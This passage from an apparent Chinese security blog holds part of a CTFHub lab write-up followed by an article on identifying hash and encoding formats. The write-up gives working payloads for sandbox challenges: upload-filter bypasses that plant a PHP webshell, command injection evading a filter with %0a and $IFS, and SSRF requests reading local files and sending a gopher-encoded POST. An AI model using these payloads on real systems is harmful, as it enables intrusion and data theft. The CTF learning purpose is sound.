<p>所以我们不能让后面的<code>rand()</code>和<code>date()</code>运行，所以对于变量<code>road</code>【也就是开始讲到的】，就需要在它后面加上一个<code>%00</code>截断后面的语句</p>
<p>也就是下面这个请求头后面</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220731233456720.png"><img src="/wp-CTFHub/image-20220731233456720.png" alt="image-20220731233456720"></a></p>
<p>图片正常上传就可以，这就是把图片内容上传到<code>1.php</code>文件中，这样虽然我们上传的是一个图片，但实际上，我们上传了一个名为<code>1.php</code>的一句话木马</p>
<p>【名字不重要，虽然图片和<code>php</code>文件名一样，这里<code>1.php</code>是随便取得，主要蚁剑连接的就是它】</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220731233716114.png"><img src="/wp-CTFHub/image-20220731233716114.png"></a></p>
<p>用蚁剑连接<code>url/upload/1.php</code></p>
<p>得到<code>flag</code></p>
<h2 id="10-文件上传-双写后缀"><a href="#10-文件上传-双写后缀" class="headerlink" title="10.文件上传-双写后缀"></a>10.文件上传-双写后缀</h2><p>进行了一次过滤php后缀名，双写php为p<u>php</u>hp，这样当过滤了__的php，剩下的仍然是php，正常用蚁剑连接</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220731165549883.png"><img src="/wp-CTFHub/image-20220731165549883.png" alt="image-20220731165549883"></a></p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220731165841829.png"><img src="/wp-CTFHub/image-20220731165841829.png" alt="image-20220731165841829"></a></p>
<p>得到flag</p>
<h2 id="11-RCE-命令注入-综合训练"><a href="#11-RCE-命令注入-综合训练" class="headerlink" title="11.RCE-命令注入-综合训练"></a>11.RCE-命令注入-综合训练</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这道题</p>
<p>看到<code>|，;，&amp;</code>都被过滤了</p>
<p>那么可以用<code>%0a</code>也是换行符代替</p>
<p>空格，&#x2F;，cat，flag，ctfhub（这些好像不大用的上，没关系）</p>
<p><code>$IFS</code>代替<code>空格</code>，<code>cat</code>可以用<code>more</code>代替，<code>%09</code>代替<code>TAB</code>键，用来补全<code>flag</code></p>
<p><code>?ip=120.0.0.1%0als</code></p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220801215911504.png"><img src="/wp-CTFHub/image-20220801215911504.png" alt="image-20220801215911504"></a></p>
<p>然后</p>
<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0als</code></p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220801215930160.png"><img src="/wp-CTFHub/image-20220801215930160.png" alt="image-20220801215930160"></a></p>
<p>后面就简单了</p>
<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0amore$IFS%09*24135173615424.php</code></p>
<p>右键查看源码</p>
<p>得到<code>flag</code></p>
<h2 id="12-SSRF-内网访问"><a href="#12-SSRF-内网访问" class="headerlink" title="12.SSRF-内网访问"></a>12.SSRF-内网访问</h2><p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220802103546644.png"><img src="/wp-CTFHub/image-20220802103546644.png" alt="image-20220802103546644"></a></p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220802103603770.png"><img src="/wp-CTFHub/image-20220802103603770.png" alt="image-20220802103603770"></a></p>
<p>所以构造payload</p>
<p><code>http://challenge-c0c40a8ea91b3909.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</code></p>
<p>得到flag</p>
<h2 id="13-SSRF-伪协议读取文件"><a href="#13-SSRF-伪协议读取文件" class="headerlink" title="13.SSRF-伪协议读取文件"></a>13.SSRF-伪协议读取文件</h2><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>事实上是其支持的协议与封装协议。而其支持的部分协议有：</p>
<pre><code>    file:// — 访问本地文件系统

    http:// — 访问 HTTP(s) 网址

    ftp:// — 访问 FTP(s) URLs

    php:// — 访问各个输入/输出流(I/O streams)
</code></pre>
<p>根据提示，flag在Web目录下，Web目录一般是在<code>/var/www/html/</code>下</p>
<p><code>http://challenge-5c45d983b45e22b7.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</code></p>
<p>得到flag</p>
<h2 id="14-SSRF-端口扫描"><a href="#14-SSRF-端口扫描" class="headerlink" title="14.SSRF-端口扫描"></a>14.SSRF-端口扫描</h2><p>端口扫描，那就利用爆破，从8000到9000扫一遍，看看flag在哪个端口下</p>
<p><code>http://challenge-30d6aa92f511ee1f.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000</code></p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220802105640721.png"><img src="/wp-CTFHub/image-20220802105640721.png" alt="image-20220802105640721"></a></p>
<p>看到长度不同，打开查看响应数据包</p>
<p>得到flag</p>
<h2 id="15-SSRF-POST请求"><a href="#15-SSRF-POST请求" class="headerlink" title="15.SSRF-POST请求"></a>15.SSRF-POST请求</h2><p><code>hint：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</code></p>
<p>开始是一个空白页面</p>
<p>网站为</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span>/?url=_</span><br></pre></td></tr></table></figure>

<p>我们在其后面加上<code>127.0.0.1/flag.php</code>看看能不能直接访问该文件</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span>/?url=<span class="number">127.0.0.1</span>/flag.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220925221703912.png"><img src="/wp-CTFHub/image-20220925221703912.png" alt="image-20220925221703912"></a></p>
<p>发现出现了一个输入框</p>
<p><code>F12</code>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=11e053e2b7900523ac51fc7606b964e2--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现了一个<code>key</code>的参数</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">key</span>=11e053e2b7900523ac51fc7606b964e2</span><br><span class="line">//<span class="built_in">key</span>是不定的哈，不要全<span class="built_in">copy</span></span><br></pre></td></tr></table></figure>

<p>我们把<code>key</code>值输入框中试试</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220925222739689.png"><img src="/wp-CTFHub/image-20220925222739689.png" alt="image-20220925222739689"></a></p>
<p>看来只能从本地<code>127.0.0.1</code>访问</p>
<p>利用<code>file://</code>伪协议从本地方式访问文件看看<code>index.php</code>文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span><span class="regexp">/?url=file:/</span><span class="regexp">//</span>var<span class="regexp">/www/</span>html/index.php</span><br></pre></td></tr></table></figure>

<p>右键查看，</p>
<p>得到<code>index.php</code>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure>

<p>以相同方式看看<code>flag.php</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span><br><span class="line">&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>根据<code>flag.php</code>最后的提示，</p>
<p>尝试 <code>Gopher</code> 协议向服务器发送 <code>POST</code> 包</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Gopher协议的格式:</span><br><span class="line"></span><br><span class="line">gopher:<span class="regexp">//</span>IP:port<span class="regexp">/_TCP/</span>IP数据流</span><br></pre></td></tr></table></figure>

<p>先构造 <code>Gopher</code>协议所需的 <code>POST</code>请求：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36          </span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-sas"><span class="keyword">key</span>=11e053e2b7900523ac51fc7606b964e2</span></span><br><span class="line"><span class="language-sas"></span></span><br><span class="line"><span class="language-sas">//Content-<span class="keyword">Length</span> 这个要和底下POST参数[包括<span class="keyword">key</span>=,4个]长度一致</span></span><br></pre></td></tr></table></figure>

<p>但是这里需要对其进行两次<code>url</code>编码</p>
<p>根据<code>hint</code>，请求有<code>curl</code>功能</p>
<p>在向服务器发送请求时，首先浏览器会进行一次 <code>URL</code>解码，</p>
<p>其次服务器收到请求后，在执行<code>curl</code>功能时，进行第二次 <code>URL</code>解码</p>
<p>因此需要两次<code>url</code>编码</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">`注`：</span><br><span class="line">在第一次编码后的数据中，将`%<span class="number">0</span>A`全部替换为`%<span class="number">0</span>D%<span class="number">0</span>A`。</span><br><span class="line"></span><br><span class="line">因为 Gopher协议包含的请求数据包中，可能包含有`=`、`&amp;`等特殊字符，</span><br><span class="line">避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把`%`后的字节当做普通字节。</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220925231951671.png"><img src="/wp-CTFHub/image-20220925231951671.png" alt="image-20220925231951671"></a></p>
<p>然后第二次编码</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220925232013164.png"><img src="/wp-CTFHub/image-20220925232013164.png" alt="image-20220925232013164"></a></p>
<p>得到</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span>%<span class="number">2520</span>%<span class="number">252</span>Fflag.php%<span class="number">2520</span>HTTP%<span class="number">252</span>F1.<span class="number">1</span>%<span class="number">250</span>D%<span class="number">250</span>AHost%<span class="number">253</span>A%<span class="number">2520127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%<span class="number">253</span>A80%<span class="number">250</span>D%<span class="number">250</span>AContent-Length%<span class="number">253</span>A%<span class="number">252036</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">250</span>D%<span class="number">250</span>AContent-Type%<span class="number">253</span>A%<span class="number">2520</span>application%<span class="number">252</span>Fx-www-form-urlencoded%<span class="number">250</span>D%<span class="number">250</span>A%<span class="number">250</span>D%<span class="number">250</span>Akey%<span class="number">253</span>D11e053e2b7900523ac51fc7606b964e2</span><br></pre></td></tr></table></figure>

<p>然后又因为<code>flag.php</code>里有<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果直接在输入框，上传POST请求又会显示</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220925222739689.png"><img src="/wp-CTFHub/image-20220925222739689.png" alt="image-20220925222739689"></a></p>
<p>这个想绕过，就只有通过<code>index.php</code>的<code>curl</code>功能，利用Gopher协议从<code>127.0.0.1</code>向目标发送<code>POST</code>请求</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?url=gopher:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">80</span>/_POST%252<span class="number">0</span>%252Fflag.php%2520HTTP%252F1.<span class="number">1</span>%250D%250AHost%253A%2520127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%253A8<span class="number">0</span>%250D%250AContent-Length%253A%252036%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220925232055769.png"><img src="/wp-CTFHub/image-20220925232055769.png" alt="image-20220925232055769"></a></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>加密密文特征</title>
    <url>/Encrypted-ciphertext-features/</url>
    <content><![CDATA[<p><a href="https://blog.51cto.com/u_15274949/2931589">原文链接</a></p>
<span id="more"></span>

<h2 id="1、MD5——示例"><a href="#1、MD5——示例" class="headerlink" title="1、MD5——示例"></a>1、MD5——示例</h2><p><u><strong>21232F297A57A5A743894A0E4A801FC3</strong></u></p>
<p>一般MD5值是<u>32位</u>由数字<code>0-9</code>和字母<code>a-f</code>所组成的字符串，如图。<u>如果出现这个范围以外的字符说明这可能是个错误的md5值</u>，就没必要再拿去解密了。16位值是取的是8~24位。</p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721175149372.png"><img src="/Encrypted-ciphertext-features/image-20220721175149372.png" alt="image-20220721175149372"></a></p>
<p>md5的三个特征：</p>
<p>1.<strong>确定性</strong>：一个原始数据的MD5值是唯一的，同一个原始数据不可能会计算出多个不同的MD5值。</p>
<p>2.<strong>碰撞性</strong>：<u>原始数据与其MD5值并不是一一对应的</u>，有可能多个原始数据计算出来的MD5值是一样的，这就是碰撞。</p>
<p>3.<strong>不可逆</strong>：也就是说如果告诉你一个MD5值，你是无法通过它还原出它的原始数据的，这不是你的技术不够牛，这是由它的算法所决定的。因为根据第2点，<u>一个给定的MD5值是可能对应多个原始数据的</u>，并且理论上讲是可以对应无限多个原始数据，所有无法确定到底是由哪个原始数据产生的。</p>
<h2 id="2、sha1——示例"><a href="#2、sha1——示例" class="headerlink" title="2、sha1——示例"></a>2、sha1——示例</h2><p><u><strong>d033e22ae348aeb5660fc2140aec35850c4da997</strong></u></p>
<p>这种加密的密文特征跟MD5差不多，只不过<u>位数是40</u></p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721175316568.png"><img src="/Encrypted-ciphertext-features/image-20220721175316568.png" alt="image-20220721175316568"></a></p>
<h2 id="3、HMAC算法——示例"><a href="#3、HMAC算法——示例" class="headerlink" title="3、HMAC算法——示例"></a>3、HMAC算法——示例</h2><p><u><strong>5b696ae7da9442ead7adc24d03cedb65</strong></u></p>
<p>HMAC (Hash-based Message Authentication Code) 常用于接口签名验证，这种算法就是在前两种加密的基础上引入了秘钥，而秘钥又只有传输双方才知道，所以基本上是破解不了的</p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721175340163.png"><img src="/Encrypted-ciphertext-features/image-20220721175340163.png" alt="image-20220721175340163"></a></p>
<h2 id="4、NTLM——示例"><a href="#4、NTLM——示例" class="headerlink" title="4、NTLM——示例"></a>4、NTLM——示例</h2><p><u><strong>209c6174da490caeb422f3fa5a7ae634</strong></u></p>
<p>这种加密是Windows的哈希密码，是 Windows NT 早期版本的标准安全协议。与它相同的还有Domain Cached Credentials（域哈希）。</p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721175431939.png"><img src="/Encrypted-ciphertext-features/image-20220721175431939.png" alt="image-20220721175431939"></a></p>
<h2 id="相似加密类型"><a href="#相似加密类型" class="headerlink" title="相似加密类型"></a>相似加密类型</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#    算法       长度</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span> 	md5 	 <span class="number">32</span>/<span class="number">16</span></span><br><span class="line"><span class="attribute">2</span> 	sha1 	    <span class="number">40</span></span><br><span class="line"><span class="attribute">3</span> 	sha256 	    <span class="number">64</span></span><br><span class="line"><span class="attribute">4</span> 	sha512 	   <span class="number">128</span></span><br><span class="line"><span class="attribute">5</span> 	adler32 	 <span class="number">8</span></span><br><span class="line"><span class="attribute">6</span> 	crc32 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">7</span> 	crc32b       <span class="number">8</span></span><br><span class="line"><span class="attribute">8</span> 	fnv132 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">9</span> 	fnv164 	    <span class="number">16</span></span><br><span class="line"><span class="attribute">10</span> 	fnv1a32 	 <span class="number">8</span></span><br><span class="line"><span class="attribute">11</span> 	fnv1a64     <span class="number">16</span></span><br><span class="line"><span class="attribute">12</span> 	gost 	    <span class="number">64</span></span><br><span class="line"><span class="attribute">13</span> 	gost-crypto <span class="number">64</span></span><br><span class="line"><span class="attribute">14</span> 	haval128,<span class="number">3</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">15</span> 	haval128,<span class="number">4</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">16</span> 	haval128,<span class="number">5</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">17</span> 	haval160,<span class="number">3</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">18</span> 	haval160,<span class="number">4</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">19</span> 	haval160,<span class="number">5</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">20</span> 	haval192,<span class="number">3</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">21</span> 	haval192,<span class="number">4</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">22</span> 	haval192,<span class="number">5</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">23</span> 	haval224,<span class="number">3</span> 	<span class="number">56</span></span><br><span class="line"><span class="attribute">24</span> 	haval224,<span class="number">4</span> 	<span class="number">56</span></span><br><span class="line"><span class="attribute">25</span> 	haval224,<span class="number">5</span> 	<span class="number">56</span></span><br><span class="line"><span class="attribute">26</span> 	haval256,<span class="number">3</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">27</span> 	haval256,<span class="number">4</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">28</span> 	haval256,<span class="number">5</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">29</span> 	joaat 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">30</span> 	md2          <span class="number">32</span></span><br><span class="line"><span class="attribute">31</span> 	md4 	     <span class="number">32</span></span><br><span class="line"><span class="attribute">32</span> 	ripemd128 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">33</span> 	ripemd160 	 <span class="number">40</span></span><br><span class="line"><span class="attribute">34</span> 	ripemd256 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">35</span> 	ripemd320 	 <span class="number">80</span></span><br><span class="line"><span class="attribute">36</span> 	sha224 	     <span class="number">56</span></span><br><span class="line"><span class="attribute">37</span> 	sha3-<span class="number">224</span> 	 <span class="number">56</span></span><br><span class="line"><span class="attribute">38</span> 	sha3-<span class="number">256</span> 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">39</span> 	sha3-<span class="number">384</span> 	 <span class="number">96</span></span><br><span class="line"><span class="attribute">40</span> 	sha3-<span class="number">512</span> 	 <span class="number">128</span></span><br><span class="line"><span class="attribute">41</span> 	sha384       <span class="number">96</span></span><br><span class="line"><span class="attribute">42</span> 	sha512/<span class="number">224</span>   <span class="number">56</span></span><br><span class="line"><span class="attribute">43</span> 	sha512/<span class="number">256</span> 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">44</span> 	snefru       <span class="number">64</span></span><br><span class="line"><span class="attribute">45</span> 	snefru256    <span class="number">64</span></span><br><span class="line"><span class="attribute">46</span> 	tiger128,<span class="number">3</span> 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">47</span> 	tiger128,<span class="number">4</span> 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">48</span> 	tiger160,<span class="number">3</span>   <span class="number">40</span></span><br><span class="line"><span class="attribute">49</span> 	tiger160,<span class="number">4</span>   <span class="number">40</span></span><br><span class="line"><span class="attribute">50</span> 	tiger192,<span class="number">3</span> 	 <span class="number">48</span></span><br><span class="line"><span class="attribute">51</span> 	tiger192,<span class="number">4</span>   <span class="number">48</span></span><br><span class="line"><span class="attribute">52</span> 	whirlpool 	 <span class="number">128</span></span><br><span class="line"><span class="attribute">53</span> 	mysql 	     老MYSQL数据库用的，<span class="number">16</span>位，且第<span class="number">1</span>位和第<span class="number">7</span>位必须为<span class="number">0</span>-<span class="number">8</span></span><br><span class="line"><span class="attribute">54</span> 	mysql5 	     <span class="number">40</span></span><br><span class="line"><span class="attribute">55</span> 	NTLM 	     <span class="number">32</span></span><br><span class="line"><span class="attribute">56</span> 	Domain Cached Credentials 	<span class="number">32</span></span><br></pre></td></tr></table></figure>

<h2 id="常用解密网站："><a href="#常用解密网站：" class="headerlink" title="常用解密网站："></a>常用解密网站：</h2><p><code>www.cmd5.com（带批量解密工具）</code></p>
<p><code>www.somd5.com</code></p>
<p><code>cmd5.la</code></p>
<p><code>pmd5.com</code></p>
<p><code>www.ttmd5.com（带批量解密工具）</code></p>
<hr>
<p><u>Base64、Base58、Base32、Base16、Base85、Base100等相似加密类型</u></p>
<h2 id="1、Base64——示例"><a href="#1、Base64——示例" class="headerlink" title="1、Base64——示例"></a>1、Base64——示例</h2><p><u><strong>YWRtaW4tcm9vdA&#x3D;&#x3D;</strong></u></p>
<p>一般情况下密文尾部都会有两个等号，明文很少的时候则没有</p>
<p>Base64编码要求把3个8位字节（38&#x3D;24）转化为4个6位的字节（46&#x3D;24），之后在6位的前面补两个0，形成8位一个字节的形式。如果剩下的字符不足3个字节，则用0填充，输出字符使用‘&#x3D;’，因此编码后输出的文本末尾可能会出现1或2个‘&#x3D;’，如图。</p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721180138424.png"><img src="/Encrypted-ciphertext-features/image-20220721180138424.png" alt="image-20220721180138424"></a></p>
<p>为了保证所输出的编码位可读字符，Base64制定了一个编码表，以便进行统一转换。编码表的大小为2^6&#x3D;64，这也是Base64名称的由来。</p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721180249541.png"><img src="/Encrypted-ciphertext-features/image-20220721180249541.png" alt="image-20220721180249541"></a></p>
<h3 id="Base64使用注意问题"><a href="#Base64使用注意问题" class="headerlink" title="Base64使用注意问题"></a>Base64使用注意问题</h3><h4 id="一、Base64和URL传参问题"><a href="#一、Base64和URL传参问题" class="headerlink" title="一、Base64和URL传参问题"></a>一、Base64和URL传参问题</h4><p>标准的Base64并不适合直接放在URL里传输，因为URL编码器会把标准Base64中的“&#x2F;”和“+”字符变为形如“%XX”的形式，而这些“%”号在存入数据库时还需要再进行转换，因为ANSI SQL中已将“%”号用作通配符。</p>
<p>为解决此问题，可采用一种用于URL的改进Base64编码，它在末尾填充’&#x3D;’号，并将标准Base64中的“+”和“&#x2F;”分别改成了“-”和“_”，这样就免去了在URL编解码和数据库存储时所要作的转换，避免了编码信息长度在此过程中的增加，并统一了数据库、表单等处对象标识符的格式。</p>
<h4 id="二、Base64和URL传参问题改善"><a href="#二、Base64和URL传参问题改善" class="headerlink" title="二、Base64和URL传参问题改善"></a>二、Base64和URL传参问题改善</h4><p>另有一种用于正则表达式的改进Base64变种，它将“+”和“&#x2F;”改成了“!”和“-”，因为“+”,“*”以及前面在IRCu中用到的“[”和“]”在正则表达式中都可能具有特殊含义。</p>
<p>此外还有一些变种，它们将“+&#x2F;”改为“-”或“.”（用作编程语言中的标识符名称）或“.-”（用于XML中的Nmtoken）甚至“_:”（用于XML中的Name）。</p>
<h4 id="三、Base64转换后比原有的字符串长1-3"><a href="#三、Base64转换后比原有的字符串长1-3" class="headerlink" title="三、Base64转换后比原有的字符串长1&#x2F;3"></a>三、Base64转换后比原有的字符串长1&#x2F;3</h4><p>Base64要求把每三个8Bit的字节转换为四个6Bit的字节（38 &#x3D; 46 &#x3D; 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1&#x2F;3。<br>四、Base64转换总结</p>
<p>Base64转换，最好是不要用在加密上，尤其是参数加密，很容易出问题。</p>
<h2 id="2、Base58——示例"><a href="#2、Base58——示例" class="headerlink" title="2、Base58——示例"></a>2、Base58——示例</h2><p><u><strong>6tmHCZvhgfNjQu</strong></u></p>
<p>它最大的特点是没有等号</p>
<p>Base58是用于比特币（Bitcoin）中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址。</p>
<p>相比Base64，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+“和”&#x2F;“符号。</p>
<p>比特币的Base58字母表：</p>
<p>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz</p>
<p>简单的说：Base58一种编码方式，跟十进制，十六进制一样，不过更短更省空间。</p>
<p>Base58的原理是什么？</p>
<p>二进制：0和1</p>
<p>十进制：1到10</p>
